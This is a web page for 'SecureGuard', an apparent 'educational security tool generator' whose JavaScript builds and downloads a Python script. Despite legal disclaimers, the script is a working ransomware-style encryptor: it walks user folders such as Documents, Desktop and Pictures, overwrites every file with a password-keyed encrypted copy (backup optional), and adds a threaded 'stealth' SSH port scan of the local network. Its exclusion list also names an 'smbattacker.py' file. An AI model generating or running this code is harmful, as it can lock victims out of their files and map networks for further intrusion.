<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureGuard - Educational Security Tool Generator</title>
    <meta name="description" content="Generate customizable Python security tools for educational purposes with configurable encryption, decryption, and network scanning capabilities.">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'dark-bg': '#0a0a0a',
                        'dark-surface': '#1a1a1a',
                        'dark-border': '#2a2a2a',
                        'orange-primary': '#ff6b35',
                        'orange-hover': '#e55a2b',
                        'text-primary': '#ffffff',
                        'text-secondary': '#a0a0a0',
                        'warning-bg': '#2d1b12',
                        'warning-border': '#4a2b1a',
                        'warning-text': '#ff6b35'
                    }
                }
            }
        }
    </script>
    <style>
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        }
        
        .gradient-border {
            background: linear-gradient(135deg, #ff6b35, #ff8c42);
            padding: 1px;
            border-radius: 8px;
        }
        
        .gradient-border-inner {
            background: #1a1a1a;
            border-radius: 7px;
        }
        
        .custom-select {
            appearance: none;
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%23a0a0a0' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e");
            background-position: right 0.75rem center;
            background-repeat: no-repeat;
            background-size: 1.25em 1.25em;
            padding-right: 2.5rem;
        }
        
        .glow-effect {
            box-shadow: 0 0 20px rgba(255, 107, 53, 0.3);
        }
        
        .feature-card {
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border: 1px solid #333;
            transition: all 0.3s ease;
        }
        
        .feature-card:hover {
            border-color: #ff6b35;
            box-shadow: 0 4px 20px rgba(255, 107, 53, 0.1);
            transform: translateY(-2px);
        }
        
        .pulse-animation {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }
    </style>
</head>
<body class="bg-dark-bg text-text-primary min-h-screen">
    <div class="container mx-auto px-4 py-8 max-w-6xl">
        <!-- Header -->
        <div class="text-center mb-12">
            <div class="inline-flex items-center justify-center w-16 h-16 bg-orange-primary rounded-full mb-4 glow-effect">
                <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z" clip-rule="evenodd"/>
                </svg>
            </div>
            <h1 class="text-5xl font-bold mb-4 bg-gradient-to-r from-orange-primary to-orange-hover bg-clip-text text-transparent">
                SecureGuard
            </h1>
            <p class="text-2xl text-text-secondary mb-8">Educational Security Tool Generator</p>
            
            <!-- Status Indicator -->
            <div class="inline-flex items-center bg-dark-surface border border-dark-border rounded-full px-4 py-2 mb-8">
                <div class="w-2 h-2 bg-green-400 rounded-full pulse-animation mr-2"></div>
                <span class="text-sm text-text-secondary">System Online</span>
            </div>
            
            <div class="bg-warning-bg border border-warning-border rounded-xl p-6 mb-8 max-w-3xl mx-auto">
                <h2 class="text-xl font-semibold text-warning-text mb-3 flex items-center">
                    <svg class="w-6 h-6 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.927c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.927zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/>
                    </svg>
                    Legal Notice
                </h2>
                <p class="text-text-secondary leading-relaxed">
                    This tool is for <strong class="text-warning-text">educational and defensive security purposes only</strong>. 
                    Use only on systems you own or have explicit permission to test. 
                    You are fully responsible for compliance with all applicable laws.
                </p>
            </div>
        </div>

        <!-- Configuration Form -->
        <div class="gradient-border mb-12">
            <div class="gradient-border-inner p-8">
                <h2 class="text-3xl font-bold mb-8 text-center">Tool Configuration</h2>
                <form id="configForm" class="space-y-8">
                <div class="grid md:grid-cols-2 gap-8">
                    <!-- Left Column -->
                    <div class="space-y-6">
                        <!-- Target Operating System -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">Target Operating System</label>
                            <select id="targetOS" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary custom-select focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all">
                                <option value="windows">ü™ü Windows</option>
                                <option value="linux">üêß Linux</option>
                                <option value="mac">üçé Mac</option>
                            </select>
                        </div>

                        <!-- Target Directory -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">Target Directory</label>
                            <select id="targetDirectory" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary custom-select focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all">
                                <!-- Options populated by JavaScript -->
                            </select>
                        </div>

                        <!-- Backup Location -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">Backup Location</label>
                            <select id="backupLocation" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary custom-select focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all">
                                <option value="none">‚ùå None (No backup)</option>
                                <!-- Options populated by JavaScript -->
                            </select>
                        </div>

                        <!-- Scan Profile -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">Network Scan Profile</label>
                            <select id="scanProfile" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary custom-select focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all">
                                <option value="stealth">üïµÔ∏è Stealth (Very slow, hard to detect)</option>
                                <option value="normal">‚öñÔ∏è Normal (Balanced speed and stealth)</option>
                                <option value="aggressive">‚ö° Aggressive (Fast but easily detected)</option>
                            </select>
                        </div>
                    </div>

                    <!-- Right Column -->
                    <div class="space-y-6">
                        <!-- File Exclusions -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">File Exclusions</label>
                            <select id="fileExclusions" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary custom-select focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all">
                                <option value="none">‚ùå None (No exclusions)</option>
                                <option value="system">üñ•Ô∏è System files only</option>
                                <option value="media">üéµ Media files (.mp3, .mp4, .jpg, etc.)</option>
                                <option value="documents">üìÑ Document files (.pdf, .doc, .txt, etc.)</option>
                                <option value="all">üìÅ All common file types</option>
                            </select>
                        </div>

                        <!-- Password -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">Encryption Password</label>
                            <input type="password" id="password" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all" 
                                   placeholder="Enter strong password" required>
                        </div>

                        <!-- Confirm Password -->
                        <div>
                            <label class="block text-lg font-semibold mb-3 text-text-primary">Confirm Password</label>
                            <input type="password" id="confirmPassword" class="w-full bg-dark-surface border border-dark-border rounded-lg px-4 py-3 text-text-primary focus:border-orange-primary focus:ring-2 focus:ring-orange-primary focus:ring-opacity-20 transition-all" 
                                   placeholder="Confirm password" required>
                        </div>

                        <!-- Generate Button -->
                        <div class="pt-4">
                            <button type="submit" class="w-full bg-gradient-to-r from-orange-primary to-orange-hover text-white font-bold py-4 px-8 rounded-lg hover:shadow-lg hover:shadow-orange-primary/25 transition-all duration-300 transform hover:scale-105 glow-effect">
                                <div class="flex items-center justify-center">
                                    <svg class="w-6 h-6 mr-2" fill="currentColor" viewBox="0 0 20 20">
                                        <path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm3.293-7.707a1 1 0 011.414 0L9 10.586V3a1 1 0 112 0v7.586l1.293-1.293a1 1 0 111.414 1.414l-3 3a1 1 0 01-1.414 0l-3-3a1 1 0 010-1.414z" clip-rule="evenodd"/>
                                    </svg>
                                    Generate Security Tool
                                </div>
                            </button>
                        </div>
                    </div>
                </div>
            </form>
        </div>

        <!-- Features Grid -->
        <div class="grid md:grid-cols-3 gap-8 mb-16">
            <div class="feature-card rounded-xl p-8 text-center">
                <div class="inline-flex items-center justify-center w-16 h-16 bg-blue-500/20 rounded-full mb-6">
                    <svg class="w-8 h-8 text-blue-400" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/>
                    </svg>
                </div>
                <h3 class="text-2xl font-bold mb-4 text-text-primary">Encryption</h3>
                <ul class="text-text-secondary space-y-3 text-left">
                    <li class="flex items-center"><span class="w-2 h-2 bg-blue-400 rounded-full mr-3"></span>Password-based file encryption</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-blue-400 rounded-full mr-3"></span>Fernet symmetric encryption</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-blue-400 rounded-full mr-3"></span>Configurable target directories</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-blue-400 rounded-full mr-3"></span>Optional file backup system</li>
                </ul>
            </div>
            
            <div class="feature-card rounded-xl p-8 text-center">
                <div class="inline-flex items-center justify-center w-16 h-16 bg-green-500/20 rounded-full mb-6">
                    <svg class="w-8 h-8 text-green-400" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M3 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm0 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm0 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zm0 4a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"/>
                    </svg>
                </div>
                <h3 class="text-2xl font-bold mb-4 text-text-primary">Network</h3>
                <ul class="text-text-secondary space-y-3 text-left">
                    <li class="flex items-center"><span class="w-2 h-2 bg-green-400 rounded-full mr-3"></span>Stealth network scanning</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-green-400 rounded-full mr-3"></span>Configurable scan profiles</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-green-400 rounded-full mr-3"></span>Port discovery capabilities</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-green-400 rounded-full mr-3"></span>Educational reconnaissance</li>
                </ul>
            </div>
            
            <div class="feature-card rounded-xl p-8 text-center">
                <div class="inline-flex items-center justify-center w-16 h-16 bg-purple-500/20 rounded-full mb-6">
                    <svg class="w-8 h-8 text-purple-400" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M3 6a3 3 0 013-3h10a1 1 0 01.8 1.6L14.25 8l2.55 3.4A1 1 0 0116 13H6a1 1 0 00-1 1v3a1 1 0 11-2 0V6z" clip-rule="evenodd"/>
                    </svg>
                </div>
                <h3 class="text-2xl font-bold mb-4 text-text-primary">Safety</h3>
                <ul class="text-text-secondary space-y-3 text-left">
                    <li class="flex items-center"><span class="w-2 h-2 bg-purple-400 rounded-full mr-3"></span>Automatic file exclusions</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-purple-400 rounded-full mr-3"></span>Educational disclaimers</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-purple-400 rounded-full mr-3"></span>Legal compliance focus</li>
                    <li class="flex items-center"><span class="w-2 h-2 bg-purple-400 rounded-full mr-3"></span>Defensive security only</li>
                </ul>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center border-t border-dark-border pt-8">
            <p class="text-text-secondary">&copy; 2025 SecureGuard - Educational Security Tool Generator</p>
            <p class="text-text-secondary text-sm mt-2">Built for educational and defensive security purposes</p>
        </div>
    </div>

    <script>
        // Configuration data
        const directories = {
            windows: [
                'C:\\\\Users\\\\%USERNAME%\\\\Documents',
                'C:\\\\Users\\\\%USERNAME%\\\\Desktop',
                'C:\\\\Users\\\\%USERNAME%\\\\Downloads',
                'C:\\\\Users\\\\%USERNAME%\\\\Pictures',
                'C:\\\\Users\\\\%USERNAME%\\\\Videos',
                'C:\\\\Users\\\\%USERNAME%\\\\Music',
                'C:\\\\Temp',
                'C:\\\\Users\\\\Public'
            ],
            linux: [
                '/home/$USER/Documents',
                '/home/$USER/Desktop',
                '/home/$USER/Downloads',
                '/home/$USER/Pictures',
                '/home/$USER/Videos',
                '/home/$USER/Music',
                '/tmp',
                '/var/tmp',
                '/home/$USER'
            ],
            mac: [
                '/Users/$USER/Documents',
                '/Users/$USER/Desktop',
                '/Users/$USER/Downloads',
                '/Users/$USER/Pictures',
                '/Users/$USER/Movies',
                '/Users/$USER/Music',
                '/tmp',
                '/Users/$USER'
            ]
        };

        const backupLocations = {
            windows: [
                'C:\\\\Backup',
                'C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\backup',
                'C:\\\\Windows\\\\Temp\\\\backup'
            ],
            linux: [
                '/tmp/backup',
                '/var/tmp/backup',
                '/home/$USER/.backup'
            ],
            mac: [
                '/tmp/backup',
                '/Users/$USER/.backup',
                '/private/tmp/backup'
            ]
        };

        // Update directory options based on OS selection
        function updateDirectories() {
            const os = document.getElementById('targetOS').value;
            const targetDir = document.getElementById('targetDirectory');
            const backupDir = document.getElementById('backupLocation');
            
            // Clear existing options
            targetDir.innerHTML = '';
            backupDir.innerHTML = '<option value="none">None (No backup)</option>';
            
            // Add target directory options
            directories[os].forEach(dir => {
                const option = document.createElement('option');
                option.value = dir;
                option.textContent = dir;
                targetDir.appendChild(option);
            });
            
            // Add backup location options
            backupLocations[os].forEach(dir => {
                const option = document.createElement('option');
                option.value = dir;
                option.textContent = dir;
                backupDir.appendChild(option);
            });
        }

        // Generate the security tool
        function generateTool(config) {
            const timestamp = new Date().toISOString();
            const template = `#!/usr/bin/env python3
"""
SecureGuard Educational Security Tool
Generated on: ${timestamp}
Configuration: ${config.targetOS.toUpperCase()}

WARNING: This tool is for educational and defensive security purposes only.
Use only on systems you own or have explicit permission to test.

REQUIRED DEPENDENCIES:
pip install cryptography

USAGE:
python secureguard_tool.py
"""

import os
import sys
import socket
import time
import threading
import base64
import shutil
from pathlib import Path

# Check for required dependencies
try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
except ImportError:
    print("ERROR: cryptography library is required!")
    print("Install it with: pip install cryptography")
    sys.exit(1)

class SecurityTool:
    def __init__(self):
        self.target_directory = r"${config.targetDirectory}"
        self.backup_location = r"${config.backupLocation}" if "${config.backupLocation}" != "none" else None
        self.scan_profile = "${config.scanProfile}"
        self.file_exclusions = "${config.fileExclusions}"
        
        print("SecureGuard Educational Security Tool")
        print("=" * 50)
        print(f"Target OS: ${config.targetOS.toUpperCase()}")
        print(f"Target Directory: {self.target_directory}")
        print(f"Backup Location: {self.backup_location or 'None'}")
        print(f"Scan Profile: {self.scan_profile}")
        print(f"File Exclusions: {self.file_exclusions}")
        print("=" * 50)
        
        # Get password from user
        self.password = input("Enter encryption password: ").encode()
        confirm_password = input("Confirm password: ").encode()
        
        if self.password != confirm_password:
            print("ERROR: Passwords do not match!")
            sys.exit(1)
        
        # Generate encryption key from password
        self.salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=self.salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        self.cipher_suite = Fernet(key)
    
    def save_key(self):
        """Save encryption key for decryption"""
        try:
            with open('thekey.key', 'wb') as key_file:
                key_file.write(self.salt)
            print("Encryption key saved to 'thekey.key'")
        except Exception as e:
            print(f"Error saving key: {e}")
    
    def load_key(self):
        """Load encryption key for decryption"""
        try:
            with open('thekey.key', 'rb') as key_file:
                salt = key_file.read()
            
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(self.password))
            self.cipher_suite = Fernet(key)
            print("Encryption key loaded successfully")
            return True
        except FileNotFoundError:
            print("ERROR: thekey.key file not found!")
            return False
        except Exception as e:
            print(f"Error loading key: {e}")
            return False
    
    def should_exclude_file(self, filepath):
        """Check if file should be excluded based on configuration"""
        filename = os.path.basename(filepath).lower()
        
        # Always exclude essential script files
        essential_files = ['encrypt.py', 'decrypt.py', 'thekey.key', 'smbattacker.py']
        if filename in essential_files:
            return True
            
        if self.file_exclusions == "none":
            return False
        elif self.file_exclusions == "system":
            system_files = ['.sys', '.dll', '.exe', '.msi']
            return any(filename.endswith(ext) for ext in system_files)
        elif self.file_exclusions == "media":
            media_files = ['.mp3', '.mp4', '.avi', '.jpg', '.jpeg', '.png', '.gif']
            return any(filename.endswith(ext) for ext in media_files)
        elif self.file_exclusions == "documents":
            doc_files = ['.pdf', '.doc', '.docx', '.txt', '.rtf']
            return any(filename.endswith(ext) for ext in doc_files)
        elif self.file_exclusions == "all":
            excluded_exts = ['.mp3', '.mp4', '.avi', '.jpg', '.jpeg', '.png', '.gif', 
                           '.pdf', '.doc', '.docx', '.txt', '.rtf', '.sys', '.dll', '.exe']
            return any(filename.endswith(ext) for ext in excluded_exts)
        
        return False
    
    def backup_file(self, filepath):
        """Backup file before encryption"""
        if not self.backup_location:
            return
            
        try:
            os.makedirs(self.backup_location, exist_ok=True)
            backup_path = os.path.join(self.backup_location, os.path.basename(filepath))
            shutil.copy2(filepath, backup_path)
            print(f"Backed up: {filepath}")
        except Exception as e:
            print(f"Backup failed for {filepath}: {e}")
    
    def encrypt_file(self, filepath):
        """Encrypt a single file"""
        if self.should_exclude_file(filepath):
            return
            
        try:
            # Backup if configured
            self.backup_file(filepath)
            
            # Read and encrypt file
            with open(filepath, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher_suite.encrypt(file_data)
            
            # Write encrypted data
            with open(filepath, 'wb') as file:
                file.write(encrypted_data)
                
            print(f"Encrypted: {filepath}")
            
        except Exception as e:
            print(f"Encryption failed for {filepath}: {e}")
    
    def decrypt_file(self, filepath):
        """Decrypt a single file"""
        if self.should_exclude_file(filepath):
            return
            
        try:
            with open(filepath, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            with open(filepath, 'wb') as file:
                file.write(decrypted_data)
                
            print(f"Decrypted: {filepath}")
            
        except Exception as e:
            print(f"Decryption failed for {filepath}: {e}")
    
    def scan_network(self):
        """Network scanning functionality"""
        print(f"Starting {self.scan_profile} network scan...")
        
        # Scan timing based on profile
        timing_configs = {
            'stealth': {'delay': 2.0, 'timeout': 10},
            'normal': {'delay': 0.5, 'timeout': 5},
            'aggressive': {'delay': 0.1, 'timeout': 1}
        }
        
        config = timing_configs[self.scan_profile]
        
        # Get local network range
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_base = '.'.join(local_ip.split('.')[:-1]) + '.'
        
        print(f"Scanning network: {network_base}0/24")
        
        def scan_host(ip):
            try:
                socket.setdefaulttimeout(config['timeout'])
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((ip, 22))  # SSH port
                if result == 0:
                    print(f"Host found: {ip}:22 (SSH)")
                sock.close()
            except:
                pass
            
            time.sleep(config['delay'])
        
        # Scan network range
        threads = []
        for i in range(1, 255):
            ip = network_base + str(i)
            thread = threading.Thread(target=scan_host, args=(ip,))
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads
            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []
        
        # Wait for remaining threads
        for t in threads:
            t.join()
    
    def run_encryption(self):
        """Run file encryption on target directory"""
        print(f"Starting encryption on: {self.target_directory}")
        
        if not os.path.exists(self.target_directory):
            print(f"Target directory does not exist: {self.target_directory}")
            return
        
        for root, dirs, files in os.walk(self.target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                self.encrypt_file(filepath)
    
    def run_decryption(self):
        """Run file decryption on target directory"""
        print(f"Starting decryption on: {self.target_directory}")
        
        if not os.path.exists(self.target_directory):
            print(f"Target directory does not exist: {self.target_directory}")
            return
        
        for root, dirs, files in os.walk(self.target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                self.decrypt_file(filepath)

def main():
    print("SecureGuard Educational Security Tool")
    print("===================================")
    print("1. Network Scan")
    print("2. Encrypt Files")
    print("3. Decrypt Files")
    
    choice = input("Select operation (1-3): ").strip()
    
    tool = SecurityTool()
    
    if choice == "1":
        tool.scan_network()
    elif choice == "2":
        tool.run_encryption()
    elif choice == "3":
        tool.run_decryption()
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
`;

            return template;
        }

        // Form submission with enhanced validation and feedback
        document.getElementById('configForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            const submitButton = e.target.querySelector('button[type="submit"]');
            const originalButtonText = submitButton.innerHTML;
            
            // Enhanced password validation
            if (password !== confirmPassword) {
                showAlert('Passwords do not match!', 'error');
                return;
            }
            
            if (password.length < 8) {
                showAlert('Password must be at least 8 characters long!', 'error');
                return;
            }
            
            if (!/^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d).+$/.test(password)) {
                showAlert('Password must contain at least one uppercase letter, one lowercase letter, and one number!', 'error');
                return;
            }
            
            // Show loading state
            submitButton.innerHTML = '<div class="flex items-center justify-center"><svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>Generating Tool...</div>';
            submitButton.disabled = true;
            
            try {
                const config = {
                    targetOS: document.getElementById('targetOS').value,
                    targetDirectory: document.getElementById('targetDirectory').value,
                    backupLocation: document.getElementById('backupLocation').value,
                    scanProfile: document.getElementById('scanProfile').value,
                    fileExclusions: document.getElementById('fileExclusions').value,
                    password: password
                };
                
                const toolCode = generateTool(config);
                
                // Create and download file
                const blob = new Blob([toolCode], { type: 'text/plain; charset=utf-8' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `secureguard_${config.targetOS}_${Date.now()}.py`;
                a.style.display = 'none';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
                
                showAlert('Security tool generated and downloaded successfully!', 'success');
                
                // Reset form
                document.getElementById('password').value = '';
                document.getElementById('confirmPassword').value = '';
                
            } catch (error) {
                console.error('Error generating tool:', error);
                showAlert('Error generating security tool. Please try again.', 'error');
            } finally {
                // Restore button state
                setTimeout(() => {
                    submitButton.innerHTML = originalButtonText;
                    submitButton.disabled = false;
                }, 2000);
            }
        });
        
        // Enhanced alert system
        function showAlert(message, type = 'info') {
            const alertDiv = document.createElement('div');
            const bgColor = type === 'success' ? 'bg-green-500' : type === 'error' ? 'bg-red-500' : 'bg-blue-500';
            
            alertDiv.className = `fixed top-4 right-4 ${bgColor} text-white px-6 py-3 rounded-lg shadow-lg z-50 transform transition-all duration-300 translate-x-full`;
            alertDiv.innerHTML = `
                <div class="flex items-center">
                    <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
                        ${type === 'success' ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/>' : 
                          type === 'error' ? '<path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"/>' : 
                          '<path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>'}
                    </svg>
                    <span>${message}</span>
                </div>
            `;
            
            document.body.appendChild(alertDiv);
            
            // Animate in
            setTimeout(() => {
                alertDiv.classList.remove('translate-x-full');
            }, 100);
            
            // Auto remove after 5 seconds
            setTimeout(() => {
                alertDiv.classList.add('translate-x-full');
                setTimeout(() => {
                    if (alertDiv.parentNode) {
                        alertDiv.parentNode.removeChild(alertDiv);
                    }
                }, 300);
            }, 5000);
        }

        // Initialize
        document.getElementById('targetOS').addEventListener('change', updateDirectories);
        updateDirectories(); // Initial load
    </script>
</body>
</html>